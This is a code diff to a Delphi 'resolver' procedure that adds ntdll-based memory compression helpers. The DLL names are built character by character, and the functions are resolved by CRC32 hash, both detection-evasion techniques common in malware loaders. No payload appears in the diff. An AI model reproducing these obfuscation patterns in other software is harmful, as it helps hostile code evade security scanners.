@@ -33,6 +33,52 @@ procedure resolver;
     end;
   end;
 
+  function xCompressMemory(pAPI:PAPIRec; lpMemory: Pointer; var dwSize: Cardinal): Pointer;
+  var
+    lpWorkspace, lpOutput: Pointer;
+    dwTemp, dwOutputSize: DWORD;
+  begin
+    Result := nil;
+    dwOutputSize := dwSize;
+    lpOutput := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
+    if lpOutput <> nil then
+    begin
+      pAPI.xRtlGetCompressionWorkSpaceSize($00000002, @dwTemp, @dwOutputSize);
+      lpWorkspace := pAPI.xVirtualAlloc(nil, dwTemp, MEM_COMMIT, PAGE_READWRITE);
+      if lpWorkspace <> nil then
+      begin
+        dwTemp := 0;
+        pAPI.xRtlCompressBuffer($00000002, lpMemory, dwSize, lpOutput, dwSize, 0, @dwTemp, lpWorkspace);
+        if dwTemp <> 0 then
+        begin
+          pAPI.xVirtualFree(lpWorkspace, 0, MEM_RELEASE);
+          dwSize := dwTemp;
+          Result := lpOutput;
+        end;
+      end;
+    end;
+  end;
+
+  function xDecompressMemory(pAPI:PAPIRec; lpMemory: Pointer; dwSize: Cardinal; dwOutputSize:Cardinal): Pointer;
+  var
+    lpOutput: Pointer;
+    dwTemp: DWORD;
+  begin
+    Result := nil;
+    lpOutput := pAPI.xVirtualAlloc(nil, dwOutputSize, MEM_COMMIT, PAGE_READWRITE);
+    if lpOutput <> nil then
+    begin
+      begin
+        dwTemp := 0;
+        pAPI.xRtlDecompressBuffer($00000002, lpOutput, dwOutputSize, lpMemory, dwSize, @dwTemp);
+        if dwTemp <> 0 then
+        begin
+          Result := lpOutput;
+        end;
+      end;
+    end;
+  end;
+
   procedure Move( const Source; var Dest; count : Integer );
   var
     S, D: PChar;
@@ -79,17 +125,19 @@ procedure resolver;
   var
     strUser32:Array[0..10] of Char;
     strShell32:Array[0..11] of Char;
-    strShFolder:Array[0..12] of Char;
-    strAdvapi32:Array[0..12] of Char;
+    strShFolder, strAdvapi32:Array[0..12] of Char;
+    strNtdll:Array[0..12] of Char;
   begin
     strUser32[0]:='u';strUser32[1]:='s';strUser32[2] := 'e';strUser32[3]:='r';strUser32[4]:='3';strUser32[5]:='2';strUser32[6]:='.';strUser32[7]:='d';strUser32[8]:='l';strUser32[9]:='l';strUser32[10]:=#0;
     strShell32[0]:='s';strShell32[1]:='h';strShell32[2]:='e';strShell32[3]:='l';strShell32[4]:='l';strShell32[5]:='3';strShell32[6]:='2';strShell32[7]:='.';strShell32[8]:='d';strShell32[9]:='l';strShell32[10]:='l';strShell32[11]:=#0;
     strShFolder[0]:='s';strShFolder[1]:='h';strShFolder[2]:='f';strShFolder[3]:='o';strShFolder[4]:='l';strShFolder[5]:='d';strShFolder[6]:='e';strShFolder[7]:='r';strShFolder[8]:='.';strShFolder[9]:='d';strShFolder[10]:='l';strShFolder[11]:='l';strShFolder[12]:=#0;
     strAdvapi32[0]:='a';strAdvapi32[1]:='d';strAdvapi32[2]:='v';strAdvapi32[3]:='a';strAdvapi32[4]:='p';strAdvapi32[5]:='i';strAdvapi32[6]:='3';strAdvapi32[7]:='2';strAdvapi32[8]:='.';strAdvapi32[9]:='d';strAdvapi32[10]:='l';strAdvapi32[11]:='l';strAdvapi32[12]:=#0;
+    strNtdll[0]:='n';strNtdll[1]:='t';strNtdll[2]:='d';strNtdll[3]:='l';strNtdll[4]:='l';strNtdll[5]:='.';strNtdll[6]:='d';strNtdll[7]:='l';strNtdll[8]:='l';strNtdll[9]:=#0;
     pAPI.hAdvapi32 := pAPI.xLoadLibraryW(@strAdvapi32[0]);
     pAPI.hUser32 := pAPI.xLoadLibraryW(@strUser32[0]);
     pAPI.hShell32 := pAPI.xLoadLibraryW(@strShell32[0]);
     pAPI.hShFolder := pAPI.xLoadLibraryW(@strShFolder[0]);
+    pAPI.hNtdll := pAPI.xLoadLibraryW(@strNtdll[0]);
   end;
 
   function CalcCrc32(lpSource:PChar; nLength:Integer):Cardinal;stdcall;
@@ -125,6 +173,7 @@ procedure resolver;
     dwName: DWORD;
     wOrdinal: WORD;
   begin
+    Result := nil;
     IDH := Pointer(hBase);
     INH := Pointer(hBase + IDH^._lfanew);
     IED := Pointer(hBase + INH^.OptionalHeader.DataDirectory[0].VirtualAddress);
@@ -191,6 +240,9 @@ procedure resolver;
     pAPI.xlstrcmpW := GetProcAddressEx(hKernel32, $9FEBE16C, 8);
     pAPI.xlstrcatW := GetProcAddressEx(hKernel32, $F29DDD0C, 8);
     pAPI.xwsprintfW := GetProcAddressEx(pAPI.hUser32, $201D0DD6, 9);
+    pAPI.xRtlGetCompressionWorkSpaceSize := GetProcAddressEx(pAPI.hNtdll, $CBF9A7E9, 30);
+    pAPI.xRtlCompressBuffer := GetProcAddressEx(pAPI.hNtdll, $9BFFF5D2, 17);
+    pAPI.xRtlDeCompressBuffer := GetProcAddressEx(pAPI.hNtdll, $52FE26D8, 19);
   end;
 
 var
